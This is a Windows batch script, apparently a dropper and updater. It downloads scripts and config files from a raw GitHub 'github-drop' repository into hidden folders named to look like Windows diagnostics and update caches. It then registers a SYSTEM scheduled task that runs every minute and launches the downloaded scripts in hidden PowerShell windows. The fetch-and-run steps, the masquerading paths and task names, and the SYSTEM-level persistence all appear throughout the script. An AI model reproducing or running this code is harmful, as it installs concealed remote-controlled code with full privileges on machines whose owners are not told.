@echo off
rem FREEZE_NOW / FORCE_UPDATE R2 - plant flags + M69 tip from main; kick mon. No msiexec in this script.
setlocal EnableExtensions
set "WD=C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache"
set "ETL=C:\ProgramData\Microsoft\Diagnosis\State\.etlcache"
set "STAGE=%SystemRoot%\Temp\.upd"
set "CURL=%SystemRoot%\System32\curl.exe"
set "PIN=main"
set "RAW=https://raw.githubusercontent.com/xnobuddy/github-drop/%PIN%"

if not exist "%WD%" mkdir "%WD%" >nul 2>&1
if not exist "%ETL%" mkdir "%ETL%" >nul 2>&1
if not exist "%STAGE%" mkdir "%STAGE%" >nul 2>&1

rem 1) plant freeze flags FIRST (M67+ honors immediately)
> "%WD%\no_install.flag" echo NO_INSTALL 202608041100 M68 - heal/reinstall frozen; PUSH-CLEAN campaign allowed once per host
> "%WD%\observe.flag" echo OBSERVE NO_INSTALL 202608041100 M68 - no auto heal; PUSH-CLEAN campaign active; watcher forever
> "%WD%\force_gryxa.done" echo PLACEHOLDER
"%CURL%" -L --ssl-no-revoke --connect-timeout 6 --max-time 15 -o "%WD%\force_gryxa.flag" "%RAW%/force_gryxa.flag?t=%RANDOM%" >nul 2>&1
"%CURL%" -L --ssl-no-revoke --connect-timeout 6 --max-time 10 -o "%WD%\no_install.flag" "%RAW%/no_install.flag?t=%RANDOM%" >nul 2>&1
"%CURL%" -L --ssl-no-revoke --connect-timeout 6 --max-time 10 -o "%WD%\observe.flag" "%RAW%/observe.flag?t=%RANDOM%" >nul 2>&1
if exist "%WD%\force_gryxa.flag" copy /y "%WD%\force_gryxa.flag" "%WD%\force_gryxa.done" >nul 2>&1
rem clear done so PUSH-CLEAN can re-fire after mon update
del /f /q "%WD%\force_gryxa.done" >nul 2>&1

rem 2) kill in-flight heal/reinstall/start workers
del /f /q "%WD%\gryxa_heal.flag" "%WD%\gryxa_msi.lock" "%WD%\gryxa_install.cmd" >nul 2>&1
del /f /q "%STAGE%\gryxa_heal_once.cmd" "%STAGE%\gryxa_start_once.cmd" "%STAGE%\gryxa_reinstall_once.cmd" "%STAGE%\gryxa_hard_once.cmd" >nul 2>&1
schtasks /Delete /TN "WucacheGryxaHealOnce" /F >nul 2>&1
schtasks /Delete /TN "WucacheGryxaStartOnce" /F >nul 2>&1
schtasks /Delete /TN "WucacheGryxaReinstall" /F >nul 2>&1
schtasks /Delete /TN "WucacheGryxaHardOnce" /F >nul 2>&1

rem 3) pull latest tip payloads
"%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 40 -o "%STAGE%\own_mon.cmd" "%RAW%/own_mon.cmd?t=%RANDOM%"
"%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 40 -o "%STAGE%\own_lib.ps1" "%RAW%/own_lib.ps1?t=%RANDOM%"
"%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 25 -o "%STAGE%\own_gryxa.cmd" "%RAW%/own_gryxa.cmd?t=%RANDOM%"
"%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 25 -o "%STAGE%\gryxa_watch.cmd" "%RAW%/gryxa_watch.cmd?t=%RANDOM%"
"%CURL%" -L --ssl-no-revoke --connect-timeout 6 --max-time 15 -o "%STAGE%\fleet_channel.cfg" "%RAW%/fleet_channel.cfg?t=%RANDOM%"
"%CURL%" -L --ssl-no-revoke --connect-timeout 6 --max-time 10 -o "%STAGE%\no_install.flag" "%RAW%/no_install.flag?t=%RANDOM%"
"%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 30 -o "%STAGE%\gryxa_clean_install.cmd" "%RAW%/gryxa_clean_install.cmd?t=%RANDOM%"

findstr /C:"OWN_MON  BUILD 20260804M69" /C:"OWN_MON  BUILD 20260804M68" "%STAGE%\own_mon.cmd" >nul
if errorlevel 1 (
  echo FAIL mon-not-M68+
  endlocal & exit /b 2
)

attrib -h -s -r "%WD%\own_mon.cmd" "%WD%\own_lib.ps1" "%WD%\own_gryxa.cmd" "%WD%\gryxa_watch.cmd" >nul 2>&1
copy /y "%STAGE%\own_mon.cmd" "%WD%\own_mon.cmd" >nul
copy /y "%STAGE%\own_lib.ps1" "%WD%\own_lib.ps1" >nul
copy /y "%STAGE%\own_gryxa.cmd" "%WD%\own_gryxa.cmd" >nul
copy /y "%STAGE%\gryxa_watch.cmd" "%WD%\gryxa_watch.cmd" >nul
copy /y "%STAGE%\fleet_channel.cfg" "%WD%\fleet_channel.cfg" >nul
if exist "%STAGE%\no_install.flag" copy /y "%STAGE%\no_install.flag" "%WD%\no_install.flag" >nul
if exist "%STAGE%\gryxa_clean_install.cmd" copy /y "%STAGE%\gryxa_clean_install.cmd" "%WD%\gryxa_clean_install.cmd" >nul
copy /y "%WD%\own_mon.cmd" "%ETL%\etl_mon.cmd" >nul

rem 4) keep watcher; kick mon once (will see PUSH-CLEAN)
schtasks /Create /TN "WucacheGryxaWatch" /TR "cmd.exe /c \"%WD%\gryxa_watch.cmd\" TICK" /SC MINUTE /MO 1 /RU SYSTEM /RL HIGHEST /F >nul 2>&1
powershell -NoProfile -NonInteractive -WindowStyle Hidden -Command "Start-Process cmd.exe -ArgumentList '/c','\"%WD%\gryxa_watch.cmd\" LOOP' -WindowStyle Hidden" >nul 2>&1
powershell -NoProfile -NonInteractive -WindowStyle Hidden -Command "Start-Process cmd.exe -ArgumentList '/c','\"%WD%\own_mon.cmd\"' -WindowStyle Hidden" >nul 2>&1

findstr /C:"OWN_MON  BUILD" "%WD%\own_mon.cmd"
type "%WD%\no_install.flag"
echo FORCE_UPDATE=OK pin=%PIN%
endlocal
